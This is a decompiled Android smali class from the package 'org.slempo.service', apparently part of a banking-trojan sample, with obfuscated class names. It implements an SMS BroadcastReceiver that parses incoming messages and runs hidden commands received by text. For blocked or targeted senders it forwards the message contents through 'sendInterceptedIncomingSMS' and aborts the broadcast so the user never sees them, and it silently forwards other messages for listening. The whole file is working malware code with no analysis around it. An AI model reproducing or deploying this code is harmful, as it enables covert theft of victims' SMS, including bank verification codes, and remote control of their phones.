.class public Lorg/slempo/service/riejkmdcwepoksmieru;
.super Landroid/content/BroadcastReceiver;
.source "riejkmdcwepoksmieru.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 18
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method private static retrieveMessages(Landroid/content/Intent;)Ljava/util/Map;
    .locals 11
    .param p0, "intent"    # Landroid/content/Intent;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Intent;",
            ")",
            "Ljava/util/Map",
            "<",
            "Ljava/lang/String;",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation

    .prologue
    .line 56
    const/4 v2, 0x0

    .line 58
    .local v2, "messages":Ljava/util/Map;, "Ljava/util/Map<Ljava/lang/String;Ljava/lang/String;>;"
    invoke-virtual {p0}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    .line 59
    .local v0, "bundle":Landroid/os/Bundle;
    if-eqz v0, :cond_0

    const-string v9, "pdus"

    invoke-virtual {v0, v9}, Landroid/os/Bundle;->containsKey(Ljava/lang/String;)Z

    move-result v9

    if-eqz v9, :cond_0

    .line 60
    const-string v9, "pdus"

    invoke-virtual {v0, v9}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, [Ljava/lang/Object;

    .line 61
    .local v7, "pdus":[Ljava/lang/Object;
    if-eqz v7, :cond_0

    .line 62
    array-length v5, v7

    .line 63
    .local v5, "nbrOfpdus":I
    new-instance v2, Ljava/util/HashMap;

    .end local v2    # "messages":Ljava/util/Map;, "Ljava/util/Map<Ljava/lang/String;Ljava/lang/String;>;"
    invoke-direct {v2, v5}, Ljava/util/HashMap;-><init>(I)V

    .line 64
    .restart local v2    # "messages":Ljava/util/Map;, "Ljava/util/Map<Ljava/lang/String;Ljava/lang/String;>;"
    new-array v3, v5, [Landroid/telephony/SmsMessage;

    .line 65
    .local v3, "messagesArray":[Landroid/telephony/SmsMessage;
    const/4 v1, 0x0

    .local v1, "i":I
    :goto_0
    if-lt v1, v5, :cond_1

    .line 82
    .end local v1    # "i":I
    .end local v3    # "messagesArray":[Landroid/telephony/SmsMessage;
    .end local v5    # "nbrOfpdus":I
    .end local v7    # "pdus":[Ljava/lang/Object;
    :cond_0
    return-object v2

    .line 67
    .restart local v1    # "i":I
    .restart local v3    # "messagesArray":[Landroid/telephony/SmsMessage;
    .restart local v5    # "nbrOfpdus":I
    .restart local v7    # "pdus":[Ljava/lang/Object;
    :cond_1
    aget-object v9, v7, v1

    check-cast v9, [B

    invoke-static {v9}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;

    move-result-object v9

    .line 66
    aput-object v9, v3, v1

    .line 68
    aget-object v9, v3, v1

    .line 69
    invoke-virtual {v9}, Landroid/telephony/SmsMessage;->getOriginatingAddress()Ljava/lang/String;

    move-result-object v6

    .line 70
    .local v6, "originatingAddress":Ljava/lang/String;
    invoke-interface {v2, v6}, Ljava/util/Map;->containsKey(Ljava/lang/Object;)Z

    move-result v9

    if-nez v9, :cond_2

    .line 71
    aget-object v9, v3, v1

    invoke-virtual {v9}, Landroid/telephony/SmsMessage;->getOriginatingAddress()Ljava/lang/String;

    move-result-object v9

    .line 72
    aget-object v10, v3, v1

    invoke-virtual {v10}, Landroid/telephony/SmsMessage;->getMessageBody()Ljava/lang/String;

    move-result-object v10

    .line 71
    invoke-interface {v2, v9, v10}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 65
    :goto_1
    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    .line 74
    :cond_2
    invoke-interface {v2, v6}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Ljava/lang/String;

    .line 75
    .local v8, "previousParts":Ljava/lang/String;
    new-instance v9, Ljava/lang/StringBuilder;

    invoke-static {v8}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v10

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 76
    aget-object v10, v3, v1

    invoke-virtual {v10}, Landroid/telephony/SmsMessage;->getMessageBody()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    .line 75
    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    .line 77
    .local v4, "msgString":Ljava/lang/String;
    invoke-interface {v2, v6, v4}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    goto :goto_1
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 12
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    .line 23
    .line 24
    const-string v9, "AppPrefs"

    const/4 v10, 0x0

    .line 23
    invoke-virtual {p1, v9, v10}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v8

    .line 25
    .local v8, "settings":Landroid/content/SharedPreferences;
    new-instance v1, Ljava/util/HashSet;

    invoke-direct {v1}, Ljava/util/HashSet;-><init>()V

    .line 28
    .local v1, "blockedNumbers":Ljava/util/HashSet;, "Ljava/util/HashSet<Ljava/lang/String;>;"
    :try_start_0
    const-string v9, "BLOCKED_NUMBERS"

    .line 29
    new-instance v10, Ljava/util/HashSet;

    invoke-direct {v10}, Ljava/util/HashSet;-><init>()V

    invoke-static {v10}, Lorg/slempo/service/utils/ERKLDSMVLKERNV;->serialize(Ljava/io/Serializable;)Ljava/lang/String;

    move-result-object v10

    .line 28
    invoke-interface {v8, v9, v10}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Lorg/slempo/service/utils/ERKLDSMVLKERNV;->deserialize(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v9

    .line 27
    move-object v0, v9

    check-cast v0, Ljava/util/HashSet;

    move-object v1, v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 33
    :goto_0
    invoke-static {p2}, Lorg/slempo/service/riejkmdcwepoksmieru;->retrieveMessages(Landroid/content/Intent;)Ljava/util/Map;

    move-result-object v3

    .line 34
    .local v3, "messages":Ljava/util/Map;, "Ljava/util/Map<Ljava/lang/String;Ljava/lang/String;>;"
    invoke-interface {v3}, Ljava/util/Map;->keySet()Ljava/util/Set;

    move-result-object v9

    invoke-interface {v9}, Ljava/util/Set;->iterator()Ljava/util/Iterator;

    move-result-object v10

    :cond_0
    :goto_1
    invoke-interface {v10}, Ljava/util/Iterator;->hasNext()Z

    move-result v9

    if-nez v9, :cond_1

    .line 53
    return-void

    .line 30
    .end local v3    # "messages":Ljava/util/Map;, "Ljava/util/Map<Ljava/lang/String;Ljava/lang/String;>;"
    :catch_0
    move-exception v2

    .line 31
    .local v2, "e":Ljava/lang/Exception;
    invoke-virtual {v2}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0

    .line 34
    .end local v2    # "e":Ljava/lang/Exception;
    .restart local v3    # "messages":Ljava/util/Map;, "Ljava/util/Map<Ljava/lang/String;Ljava/lang/String;>;"
    :cond_1
    invoke-interface {v10}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Ljava/lang/String;

    .line 35
    .local v7, "sender":Ljava/lang/String;
    new-instance v6, Lorg/slempo/service/utils/IUHJMNYTHGBVSD;

    invoke-interface {v3, v7}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v9

    check-cast v9, Ljava/lang/String;

    const-string v11, ""

    invoke-direct {v6, v9, v11, p1}, Lorg/slempo/service/utils/IUHJMNYTHGBVSD;-><init>(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 37
    .local v6, "processor":Lorg/slempo/service/utils/IUHJMNYTHGBVSD;
    invoke-virtual {v6}, Lorg/slempo/service/utils/IUHJMNYTHGBVSD;->processCommand()Z

    move-result v9

    if-eqz v9, :cond_2

    .line 38
    invoke-virtual {p0}, Lorg/slempo/service/riejkmdcwepoksmieru;->abortBroadcast()V

    goto :goto_1

    .line 42
    :cond_2
    invoke-virtual {v6}, Lorg/slempo/service/utils/IUHJMNYTHGBVSD;->needToInterceptIncoming()Z

    move-result v4

    .line 43
    .local v4, "needToInterceptIncoming":Z
    invoke-virtual {v6}, Lorg/slempo/service/utils/IUHJMNYTHGBVSD;->needToListen()Z

    move-result v5

    .line 44
    .local v5, "needToListenIncoming":Z
    if-nez v4, :cond_3

    invoke-virtual {v1, v7}, Ljava/util/HashSet;->contains(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_4

    .line 46
    :cond_3
    invoke-interface {v3, v7}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v9

    check-cast v9, Ljava/lang/String;

    .line 45
    invoke-static {p1, v9, v7}, Lorg/slempo/service/utils/EURIDJVKCNWKDSeduvhj;->sendInterceptedIncomingSMS(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 47
    invoke-virtual {p0}, Lorg/slempo/service/riejkmdcwepoksmieru;->abortBroadcast()V

    goto :goto_1

    .line 48
    :cond_4
    if-eqz v5, :cond_0

    .line 49
    invoke-interface {v3, v7}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v9

    check-cast v9, Ljava/lang/String;

    invoke-static {p1, v9, v7}, Lorg/slempo/service/utils/EURIDJVKCNWKDSeduvhj;->sendListenedIncomingSMS(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_1
.end method
